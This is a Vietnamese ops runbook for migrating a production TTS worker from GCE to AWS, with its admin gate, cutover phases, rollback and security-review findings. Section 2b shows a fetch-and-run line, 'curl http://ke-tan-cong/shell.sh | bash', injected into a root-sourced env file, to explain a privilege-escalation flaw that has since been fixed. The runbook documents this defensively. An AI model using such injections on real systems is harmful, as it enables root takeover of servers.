# Chuyen worker PRODUCTION tu GCE sang AWS

Tai lieu dieu hanh cho cuoc chuyen may worker. **Khong** doi DNS, **khong**
dong bang ghi, **khong** terminate VM nao. GCE la duong lui trong suot qua
trinh va con nguyen sau khi chot.

---

## 0. DIEU CHINH TIEN DE — DOC MUC NAY TRUOC

`docs/AWS_STAGING_MIGRATION.md` muc 0 ghi rang production dung **Appwrite
Cloud (SaaS, region `sgp`)** va rang may `fanfic-appwrite-temp` "KHONG phai
production". **Do that khong con dung nua.**

Do that ngay `2026-09-04` tu chinh dich vu Render dang phuc vu production
(`fas-prod-api`, qua `fanfic_credential_broker.render_non_secret_env` —
allowlist ap o chieu TRA VE):

| Toa do production | Gia tri that |
|---|---|
| `APPWRITE_ENDPOINT` | `https://appwrite-dev.fanfic.world/v1` |
| `APPWRITE_PROJECT_ID` | `fanfic-world-prod` |
| `APPWRITE_DATABASE_ID` | `fanfic_world_prod` |
| `R2_BUCKET` | `fanfic-prod` |
| `STORAGE_BACKEND` / `DATA_BACKEND` | `r2` / `appwrite` |

Hai he qua **phai** ghi lai:

1. May GCE ten `fanfic-appwrite-temp` (`us-central1-c`, `35.225.209.115`)
   **dang la ha tang production**, bat ke chu `temp` trong ten. Moi canh
   bao trong `AWS_STAGING_MIGRATION.md` muc 2 ve may nay (restart policy
   goc la `no`, chua bao gio reboot thu, `docker-compose.yml`/`.env` chi
   ton tai tren VM) gio la rui ro **production**, khong phai rui ro dev.
2. Cuoc chuyen nay **khong** go bo su phu thuoc vao GCE. No chi chuyen
   *worker*. Appwrite production van chay tren GCE.

Chung chi TLS o bien: `CN=fanfic.world`, Google Trust Services, het han
`2026-11-07` (Cloudflare Universal SSL, tu gia han). Chung chi **goc** phia
sau Cloudflare la ban Let's Encrypt cap tay, het han `2026-11-14`, **khong
tu gia han** — do van la mot qua bom hen gio, chi khong phai cua nhiem vu
nay.

---

## 1. TRANG THAI DO DUOC (2026-09-04)

### Ba phien ban ma nguon dang chay cung luc

| Thanh phan | SHA | Ngay | Cach xa `origin/main` |
|---|---|---|---|
| Backend API (Render `fas-prod-api`) | `516d83e` | 2026-09-03 | 65 commit |
| **Worker TTS (GCE `fanfic-worker-prod`)** | **`5c33306`** | **2026-08-21** | **313 commit** |
| May AWS (checkout san) | `9be1d07` | 2026-09-04 | 0 |

**Worker GCE la ban lac hau, khong phai API.** Worker dang cham hon API
248 commit. Day la mot su that quan trong ma ban ban giao khong neu.

### Vi sao van trien khai AWS o `origin/main` chu khong o `5c33306`

Truc giac dau tien la "chi doi may, giu nguyen ma nguon" — mot bien so mot
lan. Nhung do la truc giac **sai** o day, vi lich su Appwrite thuoc ve API
chu khong thuoc ve worker: schema production la thu ma `516d83e` can, va
`516d83e` moi hon `5c33306` rat nhieu.

Bang chung da doi chieu tung diem (`git show <sha>:<tep>`):

| Bat bien | `5c33306` | `516d83e` (API) | `9be1d07` | Ket luan |
|---|---|---|---|---|
| Cong thuc `output_key` | `audio/{owner}/{chapter}/{hash}.mp3` | y het | y het | **khong doi** — khong the mo coi audio cu |
| Bo thuoc tinh `COL_JOBS` | — | GIONG `9be1d07` tung byte | — | khong ghi thuoc tinh la |
| Bo thuoc tinh `COL_TRACKS` | — | GIONG `9be1d07` tung byte | — | khong ghi thuoc tinh la |
| `bulk_import_service.py` | khong co | **CO** | co | collection da ton tai trong Appwrite production |
| `worker.py` goi `drive_chapter_imports` | khong | **CO** | co | AWS lam dung viec API mong doi |
| Bien moi truong BAT BUOC moi | — | — | **khong co** | bien moi deu tuy chon |

Them mot lop an toan doc lap: `AppwriteMetadataStore._supported_fields()`
**bo** nhung thuoc tinh Appwrite chua co thay vi that bai — nen ke ca khi
mot migration nao do chua chay, duong tao audio khong vo.

=> Dat AWS o `origin/main` dua worker **lai gan** API, khong phai xa ra.

**Nhung phai noi thang:** cuoc chuyen nay dong thoi la mot buoc **nang ma
nguon 313 commit** cho worker. No khong phai "doi may, giu nguyen moi thu".
Cua so quan sat phai duoc doc voi hieu biet do.

### Hang doi production luc do

```
pending = 0   running = 0   lease treo = 0   an_toan_de_ban_giao = true
```

Worker TTS **khong xu ly job nao trong ~29 gio** (dong log cuoi:
`2026-09-03T03:48:28Z`). Luu luong TTS production hien gan nhu bang khong.

Mot muc tieu cua nhiem vu — "it nhat 10 job that hoan tat" — **khong the
dat duoc bang luu luong tu nhien** trong bat ky cua so hop ly nao, va
nhiem vu cam bia luu luong. Xem muc 6.

### Su co da co san, khong do cuoc chuyen nay gay ra

* `2026-09-03T02:02` worker GCE thoat bang **core dump**
  (`status=6/ABRT`, "terminate called without an active exception") sau khi
  nhan SIGTERM va bo lai **4 job dang chay**. Chung duoc nhan lai sau khi
  lease het han, nen khong mat du lieu — nhung do la ly do pha DRAIN cua
  cong cu nay **cho hang doi rong truoc**, khong dua vao "dung sach".
* `fanfic-translation-worker-prod` dang chay voi `storage_backend=local`,
  `r2_configured=false`, va **dung mot giong** (`piper:ngochuyen`). Da nhu
  vay tu `2026-08-24`. Ngoai pham vi nhiem vu nay; ghi lai de khong ai
  tuong cuoc chuyen gay ra.
* Render co hai bien moi truong ten **`Key`** va **`Value`** — gan nhu chac
  chan la mot lan dan nham o form. Vo hai, nen don.

---

## 2. CO CHE

```
scripts/ops/cutover_target.py     allowlist + khang dinh (thuan tuy, 34 bai kiem)
scripts/ops/validate_prod_env.py  chay ban khang dinh do TREN may dich
scripts/ops/prod_probe.py         do hang doi production — CHI DOC
scripts/ops/appwrite_latency.py   do do tre KE CA khi HTTP khong-2xx (16 bai kiem)
scripts/ops/prod_preflight.py     nghiem thu hinh dang production, khong tieu job
scripts/ops/prod_canary.py        mot job DRAFT that, chung minh AWS so huu
scripts/ops/fanfic_prod_admin.sh  cong dieu hanh HEP tren AWS (10 verb)
scripts/ops/install_prod_admin.sh trinh cai mot lan, can root
scripts/ops/prod_cutover.py       dieu phoi 6 pha (23 bai kiem)
```

### Vi sao khong phai mot cau sudo

Mot cau `sudo` tu xa cho moi thao tac se bien vong dieu hanh thanh mot
duong leo thang quyen tuy y. Thay vao do, cung hinh dang da chung minh o
`fanfic_staging_admin.sh`:

* `ubuntu` chi **GHI** duoc mot dong verb vao `/var/lib/fanfic-prod-admin/req`
  (thu muc `0730 root:ubuntu`: tao duoc tep, **khong liet ke duoc**)
* root (qua timer 15 giay) doc verb, **loc con `[a-z0-9-]`**, doi chieu
  ALLOWLIST, roi goi dung ham da viet san
* verb **khong bao gio** di vao shell; khong tham so duong dan; khong `eval`

Bi mat production di duong rieng: Render -> **stdin cua `ssh`** ->
`/var/lib/fanfic-prod-admin/env.stage` (`0620 root:ubuntu` — `ubuntu` GHI
duoc, **KHONG DOC lai duoc**) -> root kiem bang `validate_prod_env.py` ->
`/etc/fanfic-audio/worker-prod.env` (`0640 root:fanfic`). Khong bao gio qua
`argv`, khong bao gio ra stdout, khong bao gio xuong dia may dieu hanh.

### Rao chan quan trong nhat

`fanfic-prod-admin start` **TU CHOI** khi:

1. tep env khong qua `validate_prod_env.py`
2. bat ky unit **staging** nao tren cung may con `active`
3. co worker **NGOAI** may nay dang giu mot lease con han tren hang doi
   production (`prod_start_guard.py`)

Rao chan 3 ton tai vi rao chan "GCE phai da dung" cua bo dieu phoi song
tren may DIEU HANH, con verb `start` thi den tu mot hang doi ma ben
khong-dac-quyen ghi duoc — nen no co the toi ma khong he di qua bo dieu
phoi. Gioi han that, noi thang: khi hang doi RONG khong co lease nao de
doc, nen no khong phat hien duoc mot GCE dang chay nhung ranh. Doi lai,
khi hang doi rong thi cung khong co viec gi de trung.

---

## 2b. RA SOAT BAO MAT DOC LAP — 10 PHAT HIEN, DA SUA HET

Ban ra soat doi khang do **Antigravity Claude Opus** thuc hien
(`2026-09-04`, 751 giay, packet 135 KB) tra ve **STATUS: UNSAFE** voi
1 CRITICAL, 2 HIGH, 4 MEDIUM, 3 LOW. Tat ca da duoc sua tai goc va co bai
kiem hoi quy rieng (`server/tests/test_cutover_injection.py`).

### F1 (CRITICAL) — leo thang quyen `ubuntu` -> root

Lo hong **that**, khong phai gia thuyet. Bo phan tich Python bo qua moi
dong khong co `=`; con tep env thi duoc `bash` doc bang
`. <(tr -d '\r' < "$ENV_PROD")` **bang root**. Nen:

```
# ubuntu ghi env.stage co them mot dong:
curl http://ke-tan-cong/shell.sh | bash
# -> `install-env` kiem: DAT (bo phan tich bo qua dong do)
# -> `preflight`   : bash SOURCE tep -> dong do chay bang ROOT
```

Ke tan cong **khong can mot credential that nao**: moi toa do khong-bi-mat
deu nam san trong ma nguon, con bi mat thi chi can khac rong.

| Hang muc | Truoc khi sua | Sau khi sua |
|---|---|---|
| Doc tep env | `bash` **source** (thuc thi) | Python **phan tich** (`doc_env_text`) — khong con duong `source` nao |
| Cai tep env | copy tep **tho** | cai ban **sinh lai** tu allowlist (`--emit`) |
| Bien ngoai allowlist | bo qua im lang | **tu choi** |
| Gia tri chua `$ ` `` ` `` `;` `\|` `&` `<` `>` `\` newline | cho qua | **tu choi** |
| Kiem sau khi sinh lai | khong co | kiem **lan hai** truoc khi dat vao `/etc` |

Ba lop doc lap: khong con sink, noi dung duoc sinh lai, va gia tri bi loc.

### F2 + F3 (HIGH/MEDIUM) — ma cua ben khong-dac-quyen chay bang root

Trinh cai tung lui ve `/home/ubuntu/fanfic_prod_admin.sh` khi checkout
thieu tep. Mot lan `git fetch` that bai la du de dat **ma cua ke tan cong**
vao `/usr/local/sbin/fanfic-prod-admin`, chay bang root moi 15 giay. Duong
lui do **da bi go bo**; nguon duy nhat la checkout git (thuoc root), va
lenh nguoi van hanh chay cung tro thang vao checkout chu khong vao `/home`.

### F5 (HIGH) — `start` khong co rao chan worker ngoai

Da them `prod_start_guard.py`, xem muc tren.

### F6, F7, F9, F10 (MEDIUM/LOW)

| Ma | Van de | Sua |
|---|---|---|
| F6 | `observe` khong theo doi GCE; mot dong doi bat lai GCE giua cua so 30 phut la khong ai biet | moi vong lay mau doc ca GCE; GCE song lai -> **dung ngay**, va **khong** tu dong lui (lui la bat GCE, ma GCE dang chay san — can nguoi chon giu ben nao) |
| F7 | `rollback` bo qua ma thoat cua buoc dung AWS roi van bat GCE -> ca hai cung chay | doc lai trang thai THAT cua AWS; con `active` thi **khong** bat GCE, tra ma 3 |
| F9 | TOCTOU giua "hang doi rong" va `disable` tren GCE | do lai ngay truoc khi dung; co job moi -> huy DRAIN. Thu hep cua so, **khong** dong duoc hoan toan — noi thang thay vi gia vo |
| F10 | `rollback` bao PASS chi dua vao `is-active` sau 15 giay | doc **hai lan** cach nhau, va doi **nhip moi** tu `--check` (bang chung vong quet dang quay, khong chi tien trinh con song) |

### F4, F8 (LOW)

`F4` — nhat ky kiem toan da chuyen ra **ngoai** cay git
(`~/.fanfic/cutover-audit.jsonl`, doi duoc bang `FANFIC_CUTOVER_AUDIT`):
mot lan `git add -A` khong con keo no vao lich su kho.

`F8` — ban khang dinh nguoc gio kiem **ca bon** toa do (them
`APPWRITE_ENDPOINT`, `APPWRITE_DATABASE_ID`), doi xung voi ban xuoi.

### Goal 2 (ro ri bi mat) — khong co phat hien HIGH/CRITICAL

Ban ra soat ket luan ky luat xu ly bi mat la **manh**: `tom_tat_env` che
gia tri, `render_env_text` chi phat `KEY=VALUE` cho ten trong allowlist,
bi mat di qua stdin cua SSH chu khong qua argv, tep env `0640 root:fanfic`.

---

## 3. SAU PHA

| Pha | Lam gi | Cham GCE? |
|---|---|---|
| `status` | do ca hai may + hang doi | doc |
| `prepare` | stage ma + dat env + preflight | **khong** |
| `drain` | cho hang doi rong, roi `disable --now` 3 unit GCE | dung dich vu |
| `canary` | tat staging AWS -> bat production AWS -> 1 job DRAFT that | khong |
| `observe` | lay mau dinh ky, tu dong lui khi hoi quy | khong |
| `commit` | chot cau hinh cuoi cung | khong |
| `rollback` | dung AWS, bat lai GCE | bat lai |

```bash
python scripts/ops/prod_cutover.py status
python scripts/ops/prod_cutover.py prepare
python scripts/ops/prod_cutover.py drain --dry-run     # do truoc
python scripts/ops/prod_cutover.py drain
python scripts/ops/prod_cutover.py canary
python scripts/ops/prod_cutover.py observe --minutes 30
python scripts/ops/prod_cutover.py commit
python scripts/ops/prod_cutover.py rollback            # bat ky luc nao
```

**`rollback` chay doc lap.** No khong doc tep trang thai nao — no suy ra
viec phai lam tu chinh hai may. Mot pha truoc do that bai giua chung khong
lam mat kha nang lui. Co mot bai kiem doc **ma nguon** cua `pha_rollback`
va that bai neu ai do them `json.load`/`read_text` vao do.

---

## 4. BUOC DUY NHAT CAN NGUOI

Cai cong dieu hanh production, **mot lan**, tren may AWS:

```bash
ssh -i ~/.ssh/<khoa>.pem ubuntu@<ip-aws> \
  'sudo git -C /opt/fanfic-audio fetch origin \
   && sudo git -C /opt/fanfic-audio reset --hard origin/main \
   && sudo bash /opt/fanfic-audio/scripts/ops/install_prod_admin.sh'
```

**Vi sao chay tu `/opt` chu khong tu `/home/ubuntu`:** ban truoc bao nguoi
van hanh `sudo bash /home/ubuntu/install_prod_admin.sh`. Giua luc `scp` va
luc nguoi van hanh go lenh, `ubuntu` **thay duoc tep do** — nguoi van hanh
se chay ma cua ke tan cong bang root (phat hien F2). `/opt/fanfic-audio`
thuoc root va noi dung den tu git, nen khong co cua so do.

Trinh cai **khong bat dich vu nao** — cai xong may van dung yen.

Credential production **khong** can nguoi: chung den tu Render qua
`fanfic_credential_broker` (khoa Render nam trong Windows Credential
Manager cua may dieu hanh). Ranh gioi root-only cua GCE **khong** phai di
qua.

---

## 5. KHOANG TRONG DO TRE APPWRITE — DA DONG

Bo thu thap cu goi `curl ... || echo "khong do duoc"`, nen cot "do tre
Appwrite" trong moi bao cao staging deu trong.

Nguyen nhan goc khong phai "khong do duoc" ma la **tron lan hai cau hoi**:

1. mat bao lau de nhan duoc mot cau tra loi (**luon** do duoc, mien la co
   byte nao quay ve — ke ca 401)
2. cau tra loi do co phai tin hieu khoe manh khong

`scripts/ops/appwrite_latency.py` tach hai cau hoi do. `do_tre_giay` duoc
ghi nhan ngay ca khi `http_status` la 401/404/500; `khoe` chi `True` khi
2xx; `lop_that_bai` phan loai `dns` / `tls` / `ket_noi` / `het_gio` /
`http`.

**Cong khong bi noi long.** `khoe` va `do_tre_giay` la hai truong rieng, va
`dong_tom_tat()` in `KHONG-KHOE(...)` khi trang thai hong du do tre co dep
den may. Co bai kiem cho dung dieu do
(`test_co_do_tre_nhung_khong_khoe_thi_KHONG_hien_thi_nhu_dat`).

Do that tu may dieu hanh: `GET https://appwrite-dev.fanfic.world/v1/health/version`
-> **HTTP 200**, `{"version":"1.9.6"}`, ~0,39 s. Endpoint **production** tra
2xx khong can xac thuc; cai tra khong-2xx la endpoint **staging** (Appwrite
Cloud doi header du an). Nen o production cot nay se co so that.

---

## 6. VE MUC TIEU "10 JOB THAT"

Khong dat duoc bang luu luong tu nhien: production khong co job TTS nao
trong ~29 gio truoc khi do. Nhiem vu cam bia luu luong de dat con so, nen
**khong bia**.

Bang chung thay the, theo thu tu suc manh:

1. **Canary DRAFT that** — di het chuoi Appwrite claim -> worker AWS ->
   Piper -> upload R2 production -> doi tuong ben -> tai lai duoc, kem hai
   bang chung so huu doc lap (`lease_owner` co PID ton tai tren may AWS, va
   khong co ban cuc bo nao de tao ket luan gia).
2. **>= 30 phut chay khoe** co lay mau, khong restart, khong lease treo.
3. **Bat ky job that nao den tu nhien** trong cua so do.

Bao cao cuoi phai noi ro con so job that dat duoc, khong duoc lam tron len.

---

## 6b. BON LOI TIM RA BANG CACH CHAY THAT (2026-09-04)

Ban ra soat bao mat tim 10 phat hien bang cach DOC. Bon loi duoi day chi
lo ra khi CHAY that — va ba trong so do nam o dung cho nguy hiem nhat:
duong bao "an toan" va duong khoi phuc.

### L1 — cong an toan bao DAT trong khi no dang TU CHOI

Cong ghi ket qua bang `{ ...; echo "# exit=$?"; } > "$out"`, tuc tep lon
dan trong luc verb chay. Bo dieu phoi doc `cat $out` moi 3 giay va tra ve
**ngay khi tep khac rong**, voi `ma_thoat` mac dinh `0`.

Hau qua do duoc: `preflight` tra ve dung `# exit=1` (unit staging con
chay), nhung bo dieu phoi doc trung phan dau, khong thay dau ket thuc, va
bao **PREPARE_PASS**.

| Hang muc | Truoc | Sau |
|---|---|---|
| Cong ghi ket qua | thang vao `$out` | tep tam roi `mv` — **nguyen tu** |
| Thieu `# exit=` | **thanh cong (0)** | chua xong, doi tiep |
| Het gio ma van thieu | — | **that bai (124)** |

### L2 — `UnicodeEncodeError` lam DO mot lan TU DONG ROLLBACK

Console Windows la cp1252; `journalctl` tra ve `—`, `→`. Tien trinh chet
**dung giua pha rollback**. Lenh bat lai GCE DA chay truoc do, nhung ban
ghi noi "dang lui" roi im — khong ai biet lui xong hay chua. (Kiem tay
ngay sau: GCE 3/3 `active`, nhip 1 giay.)

Sua: `reconfigure(utf-8, replace)` cho stdout/stderr, va MOI dau ra tu xa
di qua `_in_khoi()` — mot ham khong bao gio nem. **Mot loi HIEN THI khong
duoc phep lam do mot duong khoi phuc.**

### L3 — thieu `translation-worker-prod.env`

`fanfic-translation-worker-prod.service` chet voi "Failed to load
environment files" roi restart vo han. Trinh cai chi tao tep env cua
worker TTS. Worker dich co hinh dang env KHAC (xem muc 6c).

**Rao chan da lam dung viec:** worker TTS len `active`, worker dich khong
len -> `start` tra `exit=1` -> canary FAIL -> rollback. Cai hong la duong
hien thi cua rollback, khong phai rao chan.

### L4 — `update` bao thanh cong trong khi khong dong bo duoc cong

`ProtectSystem=full` lam `/usr` chi doc, nen
`install ... /usr/local/sbin/fanfic-prod-admin` luon that bai. Loi bi nuot
bang `2>/dev/null || true`. Do that: sau HAI lan `update` bao `exit=0`,
`grep -c install-translation-env` tren ban root van tra ve **0**.

Sua: them `/usr/local/sbin` vao `ReadWritePaths`, va buoc dong bo khong
con nuot loi. Nguon copy la `/opt/fanfic-audio` — `root:root` hoan toan
tren may nay (da kiem), nen khong ai khong-dac-quyen chen duoc ma vao do.

---

## 6b-2. RA SOAT VONG HAI — SAFE, khong hoi quy

Sau khi sua bon loi o tren, toan bo phan thay doi duoc gui lai cho cung
ban ra soat doi khang (Antigravity Claude Opus, 186 giay, packet 45 KB).

**STATUS: SAFE.** Khong co hoi quy: ca ba sua cua vong mot (chan chen lenh
F1, khong nuot loi trong `update`, doc ket qua khong fail-open) deu con
nguyen hoac manh hon.

| Muc tieu | Ket luan |
|---|---|
| `/usr/local/sbin` co thanh duong leo thang quyen khong | **khong** — nguon la `/opt/fanfic-audio` thuoc root, `ubuntu` khong ghi duoc, `NoNewPrivileges=true` |
| Verb moi co lam song lai lo hong F1 khong | **khong** — cung duong sinh-lai-tu-allowlist, khong cho nao `source` tep |
| Hai bo khang dinh co lan sang nhau duoc khong | **khong** — tep stage, duong dich va co validator deu dong cung theo tung verb |
| `cong()` co bi lua tra ve 0 khong | rui ro **THAP**, xem duoi |
| `_in`/`_in_khoi` nuot ngoai le co giau that bai khong | **khong** — chi la ham hien thi; moi luong dieu khien dung ma thoat |
| `pha_commit` co bao PASS tren trang thai xau khong | **khong** — job trung hoac audio khong lay duoc deu TU CHOI |

### Viec con lai (THAP, co y hoan)

`cong()` lay dong `# exit=` **cuoi cung**. Ban ra soat chi ra rang neu bo
drain bi giet dung khoanh khac giua hai lenh VA dau ra cua verb tu no chua
mot dong bat dau bang `# exit=`, ket qua co the bi doc nham. Trong thuc te
ke tan cong khong dieu khien duoc ma cua verb (checkout thuoc root) va
khong ep duoc mot lan giet chinh xac den vay.

**Co y KHONG sua trong luc cutover dang chay:** doi `cong()` bay gio nghia
la ma chay pha COMMIT khac ma da chay pha DRAIN/CANARY. Doi mot cong cu
dieu hanh giua chung mot thao tac la rui ro lon hon chinh cai no sua. Sua
sau khi chot, kem bai kiem doi dau `# exit=` phai la dong khong-rong CUOI
CUNG cua tep.

---

## 6c. WORKER DICH CO HINH DANG ENV KHAC

Do that tu log khoi dong `fanfic-translation-worker-prod` tren GCE
(2026-08-24). KHONG suy dien tu worker TTS.

| Bien | Worker TTS | Worker dich |
|---|---|---|
| `STORAGE_BACKEND` | `r2` | **`local`** |
| Credential R2 | co | **khong** — khang dinh chan tuong minh |
| `FAS_LOCAL_VOICES` | 25 giong | **`piper:ngochuyen`** |
| `FAS_TRANSLATION_INLINE_WORKER` | — | **`false`** |

Worker dich sinh VAN BAN, khong sinh audio, nen no khong can va khong duoc
nhan credential R2. Mot khoa thua la mot khoa co the ro ri ma khong ai co
ly do de dung.

**Ghi lai de khong ai tuong nham:** tren GCE worker nay co
`translation_provider_configured: false` — no dang chay nhung khong dich
duoc gi. Ban sao tren AWS giu nguyen tinh trang do; cuoc chuyen nay khong
sua no, va cung khong lam no te hon.

---

## 7. GIU DUONG LUI

* GCE **khong** bi terminate, khong bi xoa disk, khong bi doi cau hinh.
  Chi ba unit worker bi `disable --now`.
* Giu it nhat **24 gio** sau khi chot, tuy tin dung GCE con lai.
* Muon lui: `python scripts/ops/prod_cutover.py rollback`.
* Nhat ky kiem toan: `docs/reports/cutover-audit.jsonl` (JSONL; chi ten va
  ket qua, khong bao gio gia tri) + `/var/log/fanfic-prod-admin.log` tren
  may AWS.
